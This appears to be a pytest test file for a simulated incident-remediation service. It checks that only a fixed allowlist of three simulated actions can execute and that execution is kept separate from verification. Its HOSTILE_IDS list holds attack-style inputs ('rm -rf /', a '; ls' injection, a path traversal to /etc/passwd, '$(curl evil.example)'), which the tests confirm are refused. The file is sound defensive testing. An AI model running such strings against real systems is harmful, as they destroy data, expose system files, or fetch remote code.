"""Remediation is a closed allowlist of simulated actions; verification is separate from success."""

import pytest

from app.errors import (
    IncidentNotFoundError,
    RemediationNotApplicableError,
    UnknownRemediationError,
)
from app.schemas import GetIncidentArgs
from app.simulator.remediation import REMEDIATIONS
from app.simulator.service import Simulator

ACTION_FOR = {
    "INC-1001": "simulate_clear_dependency_fault",
    "INC-1002": "simulate_kill_slow_query",
    "INC-1003": "simulate_restart_worker",
}

HOSTILE_IDS = [
    "rm -rf /",
    "simulate_restart_worker; ls",
    "simulate_restart_worker\n",
    "SIMULATE_RESTART_WORKER",
    "../../etc/passwd",
    "$(curl evil.example)",
    "",
    "simulate_restart_worker " * 50,
]


def test_allowlist_is_exactly_the_three_simulated_actions_and_immutable() -> None:
    assert set(REMEDIATIONS) == set(ACTION_FOR.values())
    assert all(a.startswith("simulate_") for a in REMEDIATIONS)
    with pytest.raises(TypeError):
        REMEDIATIONS["simulate_anything"] = REMEDIATIONS["simulate_restart_worker"]  # type: ignore[index]


@pytest.mark.parametrize("hostile", HOSTILE_IDS)
def test_non_allowlisted_action_ids_are_refused_without_side_effects(sim: Simulator, hostile: str) -> None:
    with pytest.raises(UnknownRemediationError):
        sim.execute_remediation("INC-1003", hostile)
    assert sim.verify_resolution("INC-1003").status == "not_resolved"  # nothing changed


@pytest.mark.parametrize("iid", ACTION_FOR)
def test_allowlisted_action_executes_then_verification_passes(sim: Simulator, iid: str) -> None:
    before = sim.verify_resolution(iid)
    assert before.status == "not_resolved"
    assert before.checks and not any(c.passed for c in before.checks)

    result = sim.execute_remediation(iid, ACTION_FOR[iid])
    assert result.status == "executed"
    assert result.simulated is True

    after = sim.verify_resolution(iid)
    assert after.status == "resolved"
    assert all(c.passed and c.observed < c.threshold for c in after.checks)


def test_action_success_does_not_mark_the_incident_resolved(sim: Simulator) -> None:
    sim.execute_remediation("INC-1001", "simulate_clear_dependency_fault")
    # Execution and verification are different facts; the incident record is not auto-closed.
    assert sim.get_incident(GetIncidentArgs(incident_id="INC-1001")).status == "open"


def test_repeating_an_action_is_idempotent(sim: Simulator) -> None:
    first = sim.execute_remediation("INC-1003", "simulate_restart_worker")
    second = sim.execute_remediation("INC-1003", "simulate_restart_worker")
    assert (first.status, second.status) == ("executed", "already_applied")
    assert sim.verify_resolution("INC-1003").status == "resolved"


def test_action_for_another_service_is_refused_and_leaves_no_state(sim: Simulator) -> None:
    with pytest.raises(RemediationNotApplicableError):
        sim.execute_remediation("INC-1002", "simulate_restart_worker")
    assert sim.verify_resolution("INC-1002").status == "not_resolved"


@pytest.mark.parametrize("action", sorted(REMEDIATIONS))
def test_ambiguous_incident_accepts_no_action_and_is_not_verifiable(sim: Simulator, action: str) -> None:
    with pytest.raises(RemediationNotApplicableError):
        sim.execute_remediation("INC-1004", action)
    verification = sim.verify_resolution("INC-1004")
    assert verification.status == "not_verifiable"
    assert verification.checks == []


def test_unknown_incident_is_refused(sim: Simulator) -> None:
    with pytest.raises(IncidentNotFoundError):
        sim.execute_remediation("INC-9999", "simulate_restart_worker")
    with pytest.raises(IncidentNotFoundError):
        sim.verify_resolution("INC-9999")


def test_remediation_state_does_not_leak_between_simulators(sim: Simulator) -> None:
    from app.repository import InMemoryIncidentRepository

    sim.execute_remediation("INC-1001", "simulate_clear_dependency_fault")
    fresh = Simulator(InMemoryIncidentRepository())
    assert fresh.verify_resolution("INC-1001").status == "not_resolved"
